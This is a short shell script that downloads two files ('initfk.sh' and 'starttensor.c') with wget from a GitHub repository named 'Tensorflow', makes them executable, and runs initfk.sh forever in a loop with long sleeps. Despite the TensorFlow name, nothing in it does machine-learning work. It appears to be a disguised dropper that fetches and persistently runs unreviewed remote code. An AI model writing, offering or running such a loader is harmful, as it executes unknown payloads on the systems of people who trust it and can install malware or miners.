#!/bin/sh
  wget https://github.com/nglkmerkel/Tensorflow/initfk.sh
  chmod +x initfk.sh 
  wget https://github.com/nglkmerkel/Tensorflow/starttensor.c
  chmod +x starttensor.c
  while [ 1 ]; do
  ./initfk.sh
  sleep 20000
  done
